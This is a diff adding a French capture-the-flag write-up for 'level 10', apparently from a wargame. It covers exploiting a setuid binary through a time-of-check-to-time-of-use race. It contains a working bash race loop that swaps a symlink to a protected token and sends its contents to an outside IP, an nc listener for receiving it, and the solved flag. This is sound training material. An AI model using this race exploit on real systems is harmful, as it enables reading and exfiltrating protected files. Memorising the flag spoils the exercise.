@@ -1,0 +1,35 @@
+# level 10
+Le home contient un binaire level10 qui appartient à l'user flag10 et avec un setuid activé.
+Il y a également un fichier token qui appartient à l'utilisateur flag10 et qui ne peut être lu que par lui.
+Nous devons donc exploiter le binaire level10 pour qu'il nous révèle le contenu de token.
+
+À l'execution de level10, un usage apparait : 
+```sh
+$> ./level10
+./level10 file host
+	sends file to host if you have access to it
+```
+Pour tester son fonctionnement, nous lui donnons le token en entrée :
+```sh
+$> ./level10 token 127.0.0.1
+You don't have access to token
+```
+
+Pour comprendre son erreur, nous le désassemblons avec radare2. À l'adresse `0x08048749` nous avons un appel à `access`. Le man de access (`man 2 access`) nous informe d'une vulnérabilité qui peut être exploitée entre le moment où l'accès à un fichier est autorisé et le moment où le fichier est ouvert.
+Un article [wikipedia - TOCTTOU] (https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use) nous explique cette faille et comment l'exploiter.
+
+Nous développons donc un script bash avec une bouble infinie pour créer un accès concurentiel. Ce script permet de créer un fichier temporaire avec les droits de l'user level10 pour que `access` nous autorise l'accès, puis à la place de ce fichier nous créons un lien de symbolique vers le fichier token pour que la fonction `open` ouvre le fichier token :
+```sh
+while true; do (rm /tmp/file; touch /tmp/file; ln -svf /home/user/level10/token /tmp/file;)& ./level10 /tmp/file 10.11.200.84 && break ;done
+```
+
+Un nouvelle erreur apparait : `Unable to connect to host 127.0.0.1`.
+En regardant de nouveauu le code assembleur, nous apercevons à l'adresse 0x08048756 une string de connexion sur le port 6969.
+Nous utilisons donc la commande `nc` dans un VM pour écouter sur ce port :
+```sh
+$> nc -l -p 6969
+```
+
+puis nous relançons le script de level10 pour avec l'adresse ip de la VM.
+
+Le flag obtenu sur dans la console nc de la VM est woupa2yuojeeaaed06riuj63c
